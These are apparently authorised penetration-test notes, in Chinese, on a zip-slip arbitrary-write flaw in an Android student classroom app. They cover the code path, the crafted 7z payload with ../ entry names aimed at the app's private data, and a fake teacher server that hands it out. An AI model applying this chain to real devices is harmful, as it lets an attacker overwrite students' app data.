# ★★★ 已确证的任意写向量：Z7Extractor（libun7zip.so，无路径校验）+ 我们的 7z 载荷

时间：2026-10-07 01:45 ｜ 级别：**代码链 + 载荷实测均确证**（仅"设备端原生库行为"待实机验证）

## 一、为什么这条比之前的都强

| 项 | 之前的 FTP `rootPath` 穿越 | 本次 Z7Extractor |
|---|---|---|
| 下载来源可控 | ✅ hostName/rootPath 由我们下发 | ✅ 同左 |
| 写入落点可控 | ❓ 保存路径由调用方给定 | ✅ **档案内条目名直接决定写入路径** |
| 是否需端侧有人点 | ❓ | ❌ 解压在下载成功后**自动**发生 |
| 端侧是否有防护 | 未知 | ❌ Java 侧只有 `mkdirs`；原生库无 `../` 防护字符串 |

## 二、代码链（`pentest/cls_dec` = <学生包名>）

```
① 资源下载（档案来自我们）
   ResourceHelper.downLoadResource(ResourceInfo, listener)              (:876)
     :943  savePath = FilePathUtil.getDownLoadPath() + ...
     :973  "ztktv4_resource"
     :981  StuFtpManager.downloadFromTeacher(savePath, "ztktv4_resource", url, ...)
   StuFtpManager.downloadFromTeacher:
     :391  fileUrl = getFileUrl(p2,p3) = address + rootPath + "/" + p2 + "/" + p3
             address/rootPath ← 我们下发的 OPEN_FTP_CODE（type=50001）中的 hostName/port/rootPath
   ⇒ **档案内容与主机都在我们手里**

② 下载成功即自动解压
   ResourceHelper.lambda$doHandDownLoadSuccess$0(...)                   (:1451)
     :1464 ★ Z7Extractor.extractFile(p1 /*档案*/, p2 /*目标目录*/, callback)

③ 解压器无防护（三处都查了）
   com.hzy.lib7z.Z7Extractor (Java)
     :21-31 extractFile 只校验: 档案存在 / str2 非空 / prepareOutPath(str2)
     :45-51 prepareOutPath(str) = file.mkdirs() + isDirectory   ← ★ 没有任何 ../ 校验
     :54    System.loadLibrary("un7zip")                        ← ★ 用 libun7zip.so
   com.hzy.lib7z.ExtractCallback (Java)
     ⇒ 只有 onError/onProgress，路径处理全在原生层
   libun7zip.so（57KB，`pentest/cls_dec/lib/armeabi-v7a/`）
     ⇒ 导出: Java_com_hzy_lib7z_Z7Extractor_nExtractFile / nExtractAsset / nGetLzmaVersion
     ⇒ 符号: SzArEx_Extract / OutFile_OpenUtf16 / MyCreateDir / fopen / "can not open output file"
     ⇒ ★ 即 LZMA SDK 的 7z 示例解压器；字符串中**没有** "../" / canonical / safe 之类防护
   ⇒ **libun7zip.so 只吃 7z 格式**（SzArEx_Extract）⇒ 载荷必须是真 7z

④ 解压目标（用于算 ../ 层数）
   FilePathUtil.getDownLoadPath():
     teacher ? getXueHaiSharePath() : getXueHaiFileBasePath()
     + "/" + "ztktv4_resource" + "/"
   getXueHaiFileBasePath() = /sdcard/xuehai/<school>/<user>/...
   ⇒ 目标目录 ≈ /sdcard/xuehai/<...>/ztktv4_resource/
   ⇒ 到 /data/data/<学生包名>/shared_prefs/ 需 3~8 层 ⇒ 载荷里放了 3~8 层**全部深度**
```

## 三、载荷（已生成、已验证、已挂到 HTTP 服务）

```
pentest/payload_slip.7z   (2720B, 真 7z)
  ★ 18 个条目，名字全部带 ../ 前缀（原始字节为 "../" 共 45 次、反斜杠 0 次 ⇒ 适配 Android）
  ★ 覆盖深度 3..8：
      ../*N + data/data/<学生包名>/shared_prefs/lab_marker.xml   (6 个)
      ../*N + data/data/<学生包名>/files/lab_marker.txt          (6 个)
      ../*N + sdcard/xuehai/lab_zipslip.txt                                (6 个, 便于读回验证)
  构造方式: 7z.exe `a -mhc=off`(头不压缩, 名字 UTF-16LE 明文) + 等长原名逐条字节替换 + 重算
           NextHeaderCRC / StartHeaderCRC（脚本 pentest/build_slip_7z2.py）
  验证: `7z l -slt` 显示全部条目为 ..\..\..\... 形式且档案合法(rc=0)
```

**HTTP 服务分发规则（`fake_classroom.py`，已自测）**
```
/normal.bin   -> 170B   (普通标记载荷)
/x/abc.7z     -> 2720B  (★ 恶意 7z)
/y/z.cwp      -> 1422B  (ZIP 变体，针对完整 7-Zip 的 CWP 流程)
```

## 四、★ 2026-10-07 03:20 更新：已升级为「上游源码级确证」

设备上的 `libun7zip.so` 来自开源库 **hzy3774/AndroidUn7zip**（`com.hzy.lib7z`）。
已取回其 C++ 源码并逐行核对（工作区 `research/7zExtractor.cpp`、`research/7zFunctions.cpp`）：

```c
// 7zExtractor.cpp :: extractStream()
len = SzArEx_GetFileNameUtf16(&db, i, NULL);
SzArEx_GetFileNameUtf16(&db, i, temp);
name = temp;  destPath = name;                            // ★ 直接用档案内条目名
for (j = 0; name[j] != 0; j++)
    if (name[j] == '/') { name[j]=0; MyCreateDir(name, destDir); name[j]=CHAR_PATH_SEPARATOR; }
if (isDir) { MyCreateDir(name, destDir); continue; }
else if (OutFile_OpenUtf16(&outFile, destPath, destDir)) { ... }

// 7zFunctions.cpp :: MyCreateDir (:119) / OutFile_OpenUtf16 (:133)
char temp[PATH_MAX] = {0};
strcpy(temp, dir);                       // destDir
strcat(temp, STRING_PATH_SEPARATOR);     // + "/"
strcat(temp, (const char *) buf.data);   // + 条目名（原样，未做任何处理）
mkdir(temp, 0777)   /   OutFile_Open(p, temp)
```
**扫描结果：0 处 `".."` / realpath / canonical / strstr 校验。**

⇒ **ZIP-SLIP 在源码层成立**：条目名 `../../../../…/shared_prefs/x.xml` 会被拼成越界路径并被 `mkdir`/`fopen` 使用。

剩余未确证的只有**可达性**（必须让端侧真的下载我们的档案并走到 `Z7Extractor.extractFile`；
`ResourceHelper:1464` 在下载成功后自动调用它，因此触发点=任一走 `downloadFromTeacher` 的下载）。

✅ 已确证：库=libun7zip.so(Z7Extractor)；Java 侧仅 mkdirs；**上游 C++ 源码无任何路径校验**；
          我方载荷为合法 7z、条目名确为 `../` 形式，且已挂到 HTTP 服务（`.7z` 路径下发）。

## 四之二、另一个（不可达的）ZIP-SLIP 原语 —— 2026-10-07 04:20 附带发现

```
com/xh/xhcore/common/http/archi/HttpUtil.smali :: unzip(String zipPath, String destDir)
    ZipEntry e = zis.getNextEntry();
    String name = e.getName();                       // 条目名原样
    File f = new File(destDir + name);               // ★ 直接拼接, 无 ../ 校验
    new File(f.getParent()).mkdirs();
    new FileOutputStream(f); …copy…
⇒ 同样是无防护的 ZIP-SLIP 实现（与有 "is dangerous!" 检查的 ZipUtils 形成对比）。

但可达性统计（本次实测）：
    ztpt_dec(启动器)   : 仅类存在, **无外部调用者**
    cls_dec(云课堂)    : 仅自身 2 参→3 参重载, **无外部调用者**
    launcher_dec       : 类不存在
⇒ **死代码**，无法作为触发点。这也再次印证：**唯一可达的越界解压仍是
   云课堂 ResourceHelper → Z7Extractor.extractFile（libun7zip.so）。**
```

## 五、与课堂链的关系

```
课堂链 (OPEN_FTP_CODE → hostName/port/rootPath) 是**前提**：
  * 它让端侧把 hostName/rootPath 记进 StuFtpManager（:pswitch_1 已确证）
  * 之后任何走 downloadFromTeacher 的下载（资源包/CWP/微录）都从**我们**取文件
  * 本向量把"取到文件"升级为"写出到任意路径"（解压器决定落点）
⇒ 两条链合起来 = 完整的"模拟教师机 → 任意文件写入"链路
```
